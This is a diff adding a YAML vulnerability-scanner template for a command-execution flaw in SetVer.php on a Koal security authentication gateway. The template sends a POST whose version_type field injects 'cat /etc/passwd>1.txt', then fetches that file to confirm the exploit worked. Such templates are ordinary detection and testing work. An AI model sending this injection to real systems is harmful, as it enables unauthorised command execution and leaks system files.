@@ -1,0 +1,31 @@
+id: koal-wangguan-rce
+
+info:
+  name: 上海格尔安全认证网关管理系统SetVer.php 命令执行
+  author: Str1am
+  severity: high
+  tags: koal,rce
+
+requests:
+  - raw:
+      - |
+        POST /SetVer.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        submit_action=set_ver&version_type=1;cat /etc/passwd>1.txt
+
+      - |
+        GET /1.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
+        part: body
+        condition: and
